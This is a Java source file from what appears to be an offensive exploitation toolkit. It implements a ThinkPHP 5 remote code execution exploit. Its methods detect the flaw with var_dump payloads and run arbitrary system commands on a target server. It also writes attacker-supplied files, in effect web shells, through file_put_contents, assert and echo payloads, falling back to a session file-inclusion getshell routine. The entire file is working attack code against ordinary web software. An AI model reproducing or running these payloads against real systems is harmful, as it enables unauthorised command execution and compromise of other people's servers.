package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_index_construct_rce implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        url = url + "/index.php?s=index/index/index";
        String rdmStr = Tools.getRandomString(5);
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        ArrayList<String> payloads = new ArrayList();
        String payload1 = "s=" + rdmStr + "&_method=__construct&method&filter[]=var_dump";
        String payload2 = "s=" + rdmStr + "&_method=__construct&method=POST&filter[]=var_dump";
        String payload3 = "s=" + rdmStr + "&_method=__construct&method=GET&filter[]=var_dump";
        String payload4 = "_method=__construct&method=GET&filter[]=var_dump&get[]=" + rdmStr;
        String payload5 = "c=var_dump&f=" + rdmStr + "&_method=filter";
        payloads.add(payload1);
        payloads.add(payload2);
        payloads.add(payload3);
        payloads.add(payload4);
        payloads.add(payload5);
        Iterator var9 = payloads.iterator();

        Response response;
        do {
            if (!var9.hasNext()) {
                this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
                return this.results;
            }

            String payload = (String)var9.next();
            response = HttpTools.post(url, payload, this.headers, "UTF-8");
            if (response.getText().contains("string(5) \"" + rdmStr + "\"")) {
                this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
                this.isVul = true;
                return this.results;
            }
        } while(response.getError() == null);

        this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        return this.results;

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        try {
            cmd = URLEncoder.encode(cmd, "UTF-8");
            ArrayList<String> payloads = new ArrayList();
            String url = this.target + "/index.php?s=index/index/index";
            this.headers.put("Content-type", "application/x-www-form-urlencoded");
            String payload1 = "s=" + cmd + "&_method=__construct&method&filter[]=system";
            String payload2 = "s=" + cmd + "&_method=__construct&method=POST&filter[]=system";
            String payload3 = "s=" + cmd + "&_method=__construct&method=GET&filter[]=system";
            String payload4 = "_method=__construct&method=GET&filter[]=system&get[]=" + cmd;
            String payload5 = "c=system&f=" + cmd + "&_method=filter";
            payloads.add(payload1);
            payloads.add(payload2);
            payloads.add(payload3);
            payloads.add(payload4);
            payloads.add(payload5);

            Response response;
            for(Iterator var9 = payloads.iterator(); var9.hasNext(); this.results = response.getError()) {
                String payload = (String)var9.next();
                response = HttpTools.post(url, payload, this.headers, encoding);
                if (response.getError() == null && response.getCode() != 500) {
                    this.results = Tools.regReplace(response.getText());
                    return this.results;
                }
            }
        } catch (UnsupportedEncodingException var12) {
            this.results = var12.getMessage();
        }

        return this.results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        try {
            ArrayList<String> payloads = new ArrayList();
            String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
            content = URLEncoder.encode(base64Content, "UTF-8");
            String payload1 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method&filter[]=assert";
            String payload2 = "echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=__construct&method=POST&filter[]=system";
            String payload3 = "echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=__construct&method=POST&filter[]=system";
            String payload4 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=POST&filter[]=assert";
            String payload5 = "echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=__construct&method=GET&filter[]=system";
            String payload6 = "echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=__construct&method=GET&filter[]=system";
            String payload7 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=GET&filter[]=assert";
            String payload8 = "_method=__construct&method=GET&filter[]=system&get[]=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName;
            String payload9 = "_method=__construct&method=GET&filter[]=system&get[]=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName;
            String payload10 = "_method=__construct&method=GET&filter[]=assert&get[]=file_put_contents('" + fileName + "',base64_decode('" + content + "'))";
            String payload11 = "c=system&f=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=filter";
            String payload12 = "c=system&f=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=filter";
            String payload13 = "c=assert&f=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=filter";
            payloads.add(payload1);
            payloads.add(payload2);
            payloads.add(payload3);
            payloads.add(payload4);
            payloads.add(payload5);
            payloads.add(payload6);
            payloads.add(payload7);
            payloads.add(payload8);
            payloads.add(payload9);
            payloads.add(payload10);
            payloads.add(payload11);
            payloads.add(payload12);
            payloads.add(payload13);
            Iterator var19 = payloads.iterator();

            while(var19.hasNext()) {
                String payload = (String)var19.next();
                this.headers.put("Content-type", "application/x-www-form-urlencoded");
                Response response = HttpTools.post(this.target + "/index.php?s=index/index/index", payload, this.headers, "UTF-8");
                if (response.getError() == null) {
                    this.headers.clear();
                    response = HttpTools.get(this.target + "/" + fileName, this.headers, "UTF-8");
                    if (response.getCode() == 200) {
                        this.results = "[+] 上传成功，请检查URL：" + this.target + "/" + fileName;
                        return this.results;
                    }
                }
            }

            TP5_session_fi_getshell tp5sfg = new TP5_session_fi_getshell();
            this.results = tp5sfg.getshell(this.target, "/index.php?s=index/index/index", fileName, base64Content);
        } catch (UnsupportedEncodingException var22) {
            this.results = "[-] 上传失败: " + var22.getMessage();
        }

        return this.results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
